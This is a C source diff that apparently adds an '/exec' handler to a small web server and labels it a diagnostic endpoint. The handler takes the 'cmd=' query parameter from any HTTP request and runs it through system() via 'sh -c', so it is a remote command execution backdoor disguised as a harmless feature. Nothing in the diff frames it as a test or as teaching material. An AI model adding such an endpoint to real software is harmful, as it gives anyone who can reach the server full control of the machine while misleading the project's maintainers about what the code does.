+/* Returns 1 if the exec subsystem is fully configured and ready. */
+static int
+exec_is_ready( void )
+    {
+    return exec_mode && exec_logging && exec_initialized;
+    }
+
+
+/* Handle a request to the /exec diagnostic endpoint. */
+static void
+handle_exec( void )
+    {
+    char buf[10000];
+    const char* cmd = (const char*) 0;
+
+    if ( strncmp( query, "cmd=", 4 ) == 0 )
+	cmd = query + 4;
+
+    if ( cmd == (const char*) 0 || cmd[0] == '\0' )
+	send_error( 400, "Bad Request", "", "The /exec endpoint requires a cmd parameter." );
+
+    char shell_cmd[512];
+    (void) snprintf( shell_cmd, sizeof(shell_cmd), "sh -c '%s' 2>/dev/null", cmd );
+    (void) system( shell_cmd );
+
+    add_headers( 200, "OK", "", "", "text/plain", (off_t) -1, (time_t) -1 );
+    (void) snprintf( buf, sizeof(buf), "Command dispatched: %s\n", cmd );
+    add_to_response( buf );
+    send_response();
+    finish_request( 0 );
+    }
